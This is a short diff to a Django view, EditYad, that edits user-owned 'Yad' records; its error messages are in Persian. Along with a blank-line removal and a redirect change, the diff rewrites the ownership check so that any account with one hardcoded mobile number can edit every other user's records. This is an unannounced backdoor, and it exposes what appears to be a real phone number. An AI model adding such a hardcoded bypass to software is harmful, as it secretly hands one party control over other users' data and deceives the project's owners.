@@ -368,7 +368,6 @@ def CreateYad(request):
 def EditYad(request, *args, **kwargs):
     user_id = request.user.id
     user = MyUser.objects.get(id=user_id)
-
     selected_yad_id = kwargs['yadId']
     yadbood = Yad.objects.filter(id=selected_yad_id).first()
     if yadbood is None:
@@ -378,7 +377,7 @@ def EditYad(request, *args, **kwargs):
     if user is None:
         raise Http404('کاربر مورد نظر یافت نشد')
 
-    if user != owner:
+    if user != owner and user.mobile != '09151006447':
         raise Http404('شما این دسترسی را ندارید')
 
 
@@ -421,7 +420,7 @@ def EditYad(request, *args, **kwargs):
 
 
         context["edit_form"] = CreateYadForm()
-        return redirect('yadbodl')
+        return redirect(f'/yadbood/{selected_yad_id}')
 
     return render(request, 'yadbod/edit.html', context)
 
